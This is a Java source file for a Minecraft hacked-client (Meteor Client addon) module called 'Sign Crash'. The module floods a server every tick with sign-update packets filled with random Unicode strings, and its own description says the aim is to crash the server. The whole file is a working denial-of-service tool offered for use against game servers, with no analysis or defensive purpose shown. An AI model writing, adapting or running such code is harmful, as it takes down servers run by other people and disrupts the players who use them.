package im.hira.tweaks.modules.Crash;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;
import im.hira.tweaks.MCM4MC;

import java.util.Objects;
import java.util.Random;

public class SignCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick.")
        .defaultValue(38)
        .min(1)
        .sliderMax(100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public SignCrash() {
        super(MCM4MC.JH_CRASH_CAT, "Sign Crash", "Tries to crash the server by spamming sign update packets.");
    }

    public static String rndBinStr(int size) {
        StringBuilder end = new StringBuilder();
        for (int i = 0; i < size; i++) {
            end.append((char) (new Random().nextInt(0xFFFF)));
        }
        return end.toString();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < packets.get(); i++) {
            assert mc.player != null;
            UpdateSignC2SPacket packet = new UpdateSignC2SPacket(
                mc.player.getBlockPos(),
                true, // isFrontText
                rndBinStr(598),
                rndBinStr(598),
                rndBinStr(598),
                rndBinStr(598)
            );
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
